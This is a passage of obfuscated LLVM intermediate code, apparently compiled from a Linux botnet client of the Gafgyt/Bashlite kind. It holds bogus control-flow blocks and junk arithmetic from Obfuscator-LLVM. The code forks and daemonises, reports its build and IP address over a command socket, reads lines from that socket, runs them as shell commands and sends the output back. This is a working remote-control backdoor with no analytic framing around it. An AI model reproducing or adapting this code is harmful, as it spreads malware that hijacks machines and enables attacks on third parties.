  %_28 = sub i1 false, %1047
  %gen29 = add i1 %_28, true
  %_30 = sub i1 %1047, true
  %gen31 = mul i1 %_30, true
  %_32 = sub i1 false, %1047
  %gen33 = add i1 %_32, true
  %_34 = sub i1 %1047, true
  %gen35 = mul i1 %_34, true
  %_36 = sub i1 %1047, true
  %gen37 = mul i1 %_36, true
  %1048 = xor i1 %1047, true
  br label %originalBB27

originalBB41alteredBB:                            ; preds = %originalBB41, %163
  %1049 = load i32, i32* %25, align 4
  %1050 = icmp eq i32 %1049, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %196
  %1051 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1052 = call i32 @fclose(%struct._IO_FILE* %1051)
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %216
  %1053 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1054 = call i32 @fclose(%struct._IO_FILE* %1053)
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %235
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %256
  %1055 = load i32, i32* %15, align 4
  %1056 = call i32 @waitpid(i32 %1055, i32* %17, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %278
  %1057 = call i32 @fork() #2
  store i32 %1057, i32* %16, align 4
  %1058 = icmp ne i32 %1057, 0
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %302
  %1059 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %322
  %1060 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %348
  %1061 = call i32 @sleep(i32 30)
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %366
  %1062 = load i32, i32* @mainCommSock, align 4
  %1063 = call i8* @getBuild()
  %1064 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1065 = call i8* @inet_ntoa(i32 %1064) #2
  %1066 = call i32 (i32, i8*, ...) @sockprintf(i32 %1062, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i32 0, i32 0), i8* %1063, i8* %1065)
  store i32 0, i32* %28, align 4
  store i32 0, i32* %29, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %388
  %1067 = load i32, i32* @mainCommSock, align 4
  %1068 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %1069 = call i32 @recvLine(i32 %1067, i8* %1068, i32 4096)
  store i32 %1069, i32* %28, align 4
  %1070 = icmp ne i32 %1069, -1
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %409
  store i32 0, i32* %29, align 4
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %458
  %1071 = load i32, i32* %31, align 4
  %_90 = sub i32 %1071, 1
  %gen91 = mul i32 %_90, 1
  %_92 = sub i32 0, %1071
  %gen93 = add i32 %_92, 1
  %_94 = sub i32 0, %1071
  %gen95 = add i32 %_94, 1
  %_96 = sub i32 0, %1071
  %gen97 = add i32 %_96, 1
  %_98 = sub i32 0, %1071
  %gen99 = add i32 %_98, 1
  %_100 = sub i32 %1071, 1
  %gen101 = mul i32 %_100, 1
  %_102 = shl i32 %1071, 1
  %1072 = add i32 %1071, 1
  store i32 %1072, i32* %31, align 4
  br label %originalBB89

originalBB106alteredBB:                           ; preds = %originalBB106, %512
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %549
  %1073 = load i32, i32* %18, align 4
  %_111 = shl i32 %1073, 1
  %_112 = shl i32 %1073, 1
  %_113 = shl i32 %1073, 1
  %1074 = add nsw i32 %1073, 1
  store i32 %1074, i32* %18, align 4
  %1075 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i32 0, i32 0))
  %1076 = load i32, i32* %18, align 4
  %1077 = icmp sgt i32 %1076, 20
  br label %originalBB110

originalBB117alteredBB:                           ; preds = %originalBB117, %582
  %1078 = load i8*, i8** %33, align 8
  %1079 = load i8, i8* %1078, align 1
  %1080 = zext i8 %1079 to i32
  %1081 = icmp ne i32 %1080, 32
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %603
  %1082 = load i8*, i8** %33, align 8
  %1083 = load i8, i8* %1082, align 1
  %1084 = zext i8 %1083 to i32
  %1085 = icmp ne i32 %1084, 0
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %624
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %645
  %1086 = load i8*, i8** %33, align 8
  %1087 = load i8, i8* %1086, align 1
  %1088 = zext i8 %1087 to i32
  %1089 = icmp eq i32 %1088, 0
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %696
  %1090 = load i8*, i8** %32, align 8
  %1091 = load i8*, i8** %32, align 8
  %1092 = call i64 @strlen(i8* %1091) #10
  %_134 = sub i64 0, %1092
  %gen135 = add i64 %_134, 1
  %_136 = sub i64 %1092, 1
  %gen137 = mul i64 %_136, 1
  %1093 = sub i64 %1092, 1
  %1094 = getelementptr inbounds i8, i8* %1090, i64 %1093
  store i8 0, i8* %1094, align 1
  br label %originalBB133

originalBB141alteredBB:                           ; preds = %originalBB141, %725
  %1095 = load i8*, i8** %32, align 8
  %1096 = load i8, i8* %1095, align 1
  %1097 = zext i8 %1096 to i32
  %1098 = icmp ne i32 %1097, 0
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %748
  %1099 = load i8*, i8** %32, align 8
  %1100 = getelementptr inbounds i8, i8* %1099, i32 1
  store i8* %1100, i8** %32, align 8
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %776
  %1101 = load i8*, i8** %35, align 8
  %1102 = load i8, i8* %1101, align 1
  %1103 = zext i8 %1102 to i32
  %1104 = call i32 @toupper(i32 %1103) #10
  %1105 = trunc i32 %1104 to i8
  %1106 = load i8*, i8** %35, align 8
  store i8 %1105, i8* %1106, align 1
  %1107 = load i8*, i8** %35, align 8
  %1108 = getelementptr inbounds i8, i8* %1107, i32 1
  store i8* %1108, i8** %35, align 8
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %809
  %1109 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1109, i8 0, i64 1024, i32 16, i1 false)
  %1110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %1111 = load i8*, i8** %32, align 8
  %1112 = call i32 (i8*, i8*, ...) @szprintf(i8* %1110, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i32 0, i32 0), i8* %1111)
  %1113 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %1114 = call i32 @fdpopen(i8* %1113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store i32 %1114, i32* %37, align 4
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %837
  %1115 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %1115)
  %1116 = load i32, i32* @mainCommSock, align 4
  %1117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %1118 = call i32 (i32, i8*, ...) @sockprintf(i32 %1116, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i32 0, i32 0), i8* %1117)
  %1119 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1119, i8 0, i64 1024, i32 16, i1 false)
  %1120 = call i32 @sleep(i32 1)
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %868
  %1121 = load i8*, i8** %40, align 8
  %1122 = icmp ne i8* %1121, null
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %892
  %1123 = load i8*, i8** %40, align 8
  %1124 = call i64 @strlen(i8* %1123) #10
  %_166 = shl i64 %1124, 1
  %_167 = sub i64 %1124, 1
  %gen168 = mul i64 %_167, 1
  %_169 = sub i64 0, %1124
  %gen170 = add i64 %_169, 1
  %_171 = shl i64 %1124, 1
  %1125 = add i64 %1124, 1
  %1126 = call noalias i8* @malloc(i64 %1125) #2
  %1127 = load i32, i32* %39, align 4
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1128
  store i8* %1126, i8** %1129, align 8
  %1130 = load i32, i32* %39, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1131
  %1133 = load i8*, i8** %1132, align 8
  %1134 = load i8*, i8** %40, align 8
  %1135 = call i64 @strlen(i8* %1134) #10
  %_172 = shl i64 %1135, 1
  %_173 = sub i64 %1135, 1
  %gen174 = mul i64 %_173, 1
  %_175 = sub i64 0, %1135
  %gen176 = add i64 %_175, 1
  %_177 = sub i64 0, %1135
  %gen178 = add i64 %_177, 1
  %_179 = sub i64 %1135, 1
  %gen180 = mul i64 %_179, 1
  %_181 = sub i64 0, %1135
  %gen182 = add i64 %_181, 1
  %1136 = add i64 %1135, 1
  call void @llvm.memset.p0i8.i64(i8* %1133, i8 0, i64 %1136, i32 1, i1 false)
  %1137 = load i32, i32* %39, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1138
  %1140 = load i8*, i8** %1139, align 8
  %1141 = load i8*, i8** %40, align 8
  %1142 = call i8* @strcpy(i8* %1140, i8* %1141) #2
  %1143 = load i32, i32* %39, align 4
  %_183 = shl i32 %1143, 1
  %_184 = sub i32 0, %1143
  %gen185 = add i32 %_184, 1
  %_186 = sub i32 0, %1143
  %gen187 = add i32 %_186, 1
  %_188 = sub i32 %1143, 1
  %gen189 = mul i32 %_188, 1
  %1144 = add nsw i32 %1143, 1
  store i32 %1144, i32* %39, align 4
  br label %originalBB165

originalBB193alteredBB:                           ; preds = %originalBB193, %938
  store i32 1, i32* %41, align 4
  store i32 1, i32* %41, align 4
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %971
  %1145 = load i32, i32* %11, align 4
  br label %originalBB197
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146579359}
!2 = !{i32 -2146578668}
!3 = !{i32 -2146577974}
!4 = !{i32 -2146577214}
!5 = !{i32 -2146576391}
!6 = !{i32 -2146575484}
